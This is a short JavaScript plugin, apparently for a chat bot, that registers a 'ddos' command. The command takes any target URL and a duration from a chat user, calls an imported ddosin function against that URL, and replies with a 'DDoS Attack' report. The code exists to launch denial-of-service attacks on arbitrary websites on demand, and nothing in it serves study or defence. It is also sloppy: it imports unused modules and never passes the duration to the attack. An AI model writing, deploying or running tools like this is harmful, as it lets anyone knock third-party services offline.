const fs = require('fs');
const Jimp = require('jimp');
import { ddosin } from "../../lib/ddos.js"

let handler = async (m, { conn, command, usedPrefix, args }) => {
if (!args[0] || !args[1]) return conn.reply(m.chat, `• *Example :* ${usedPrefix}${command} https://example.com 120`, m)
let targetUrl = args[0];
let duration = parseInt(args[1]);
let attack = await ddosin(targetUrl)
let text = 'DDoS Attack\n\n'
text += '```Target:```' + ` ${targetUrl}\n`
text += '```Time:```' + ` ${duration}\n`
text += '```Method:```' + ` Mix`
m.reply(text)
}

handler.command = ["ddos"]

export default handler;